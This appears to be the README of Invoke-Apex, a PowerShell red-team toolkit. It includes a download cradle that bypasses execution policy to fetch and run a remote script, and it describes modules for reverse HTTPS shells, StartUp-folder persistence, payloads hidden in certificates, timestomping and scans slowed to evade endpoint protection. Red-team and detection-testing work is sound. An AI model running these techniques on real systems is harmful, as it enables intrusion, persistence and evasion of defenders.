```Invoke-Apex``` is a PowerShell-based toolkit consisting of a collection of techniques and tradecraft for use in red team, post-exploitation, adversary simulation, or other offensive security tasks. &nbsp;It can also be useful in identifying lapses in "malicious" activity detection processes for defenders as well.

Each technique or method in the toolkit is mapped back to a [Mitre ATT&CK](https://attack.mitre.org/) Technique ID where applicable, and the techniques and modules which they can be found in, can be viewed with the ```Invoke-MitreReference -Help``` command. See the section "The Mitre ATT&CK Reference Component" for more info!

```Invoke-Apex``` is a work-in-progress, so updates to modules, and additional capability can be expected somewhat regularly as time allows.

## General Usage

### Importing the Toolkit
```PS> Import-Module .\Invoke-Apex.psd1```

All individual "modules" (cmdlets) can of course also be dot-sourced into the current session:

```PS> . .\Invoke-DefenderTools.ps1```

Or can be invoked using a traditional ```DownloadString``` cradle, etc:

```C:\> powershell -ep bypass -nop -noni "iex (New-Object Net.Webclient).DownloadString('https://server/Invoke-DefenderTools.ps1'); Invoke-DefenderTools -GetExcludes"```

## Invoke-Utility

Miscellaneous Utilities

#### Available Commands:

```-NewCer``` (Generates a .cer certificate file with an "inactive" (no ```MZ```, ```TVq``` reference in the base64) payload section. This command should initially be invoked on attacker side, and certificate transferred to target via some other means. The certificate (prior to "activation"), should pass most inspection, and loads as a semi-valid certificate without any typical indicators of embedded payload. The resulting certificate can then be "decoded" and "activated" with the ```-CerFile```, ```-Decode``` and ```-PayloadOut``` parameters. Utilizes ```certutil.exe``` to encode and decode the certificate file.)

```-TcpScan``` (Simple TCP Port Scanner.)

Note: This is a SLOW scanner, one probe every second. The slow scanning is intentional as it helps to evade things like Symantec's Endpoint Protection firewall. The idea behind this is to generate as little noise as possible.

```-TimeStomp``` (Modifies a files' Creation Time to that of C:\windows\system32\cmd.exe. The 'TimeOf' parameter can be used to change the timestamp to match that of some other file.)

```-NewXuLiE``` (Compiles a reverse (PowerShell) HTTPS shell .NET executable in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality. It then drops the resulting executable in a randomly selected directory and creates a .lnk in current users' StartUp for persistence. The generated file will have a randomly-generated file name, a .dat extension and will be executed via "cmd /c start file.dat" in the .LNK. Requires an SSL listener on the attacker-side.)

```-NewPsDat``` (Compiles a .NET executable as a .DAT file in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality. The resulting .DAT file takes a URL to a PowerShell script as its first argument, and a valid function (within the remote) script for its second. If no valid function call is needed, supply a junk value for the second argument, in other words, it requires two arguments to fire either way. The generated file will have a randomly-generated file name, a .dat extension and can be executed via "cmd /c start file.dat", etc. Or just rename the extension to .exe and launch it as usual.)

```-NewReverse``` (Compiles a reverse (PowerShell) HTTPS shell .NET executable (exe) in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality. Requires an SSL listener on the attacker-side.)
